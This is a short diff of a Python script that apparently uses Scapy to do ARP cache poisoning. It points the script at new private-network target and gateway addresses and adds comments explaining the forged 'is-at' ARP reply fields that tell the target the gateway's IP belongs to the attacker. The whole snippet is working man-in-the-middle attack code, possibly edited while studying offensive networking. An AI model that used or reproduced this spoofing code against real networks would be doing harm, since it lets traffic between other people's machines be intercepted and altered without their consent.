@@ -3,9 +3,9 @@ import os
 import sys
 import threading
 
-interface    = "en1"
-target_ip    = "172.16.1.71"
-gateway_ip   = "172.16.1.254"
+interface    = "eth0"
+target_ip    = "10.254.0.100"
+gateway_ip   = "10.254.0.254"
 packet_count = 1000
 poisoning    = True
     
@@ -30,10 +30,10 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
     global poisoning
    
     poison_target = ARP()
-    poison_target.op   = 2
-    poison_target.psrc = gateway_ip
-    poison_target.pdst = target_ip
-    poison_target.hwdst= target_mac
+    poison_target.pdst = target_ip #tell to the target ip
+    poison_target.hwdst= target_mac #with target_mac
+    poison_target.psrc = gateway_ip #that the gateway-ip
+    poison_target.op   = 2 #is-at this mac address.
 
     poison_gateway = ARP()
     poison_gateway.op   = 2
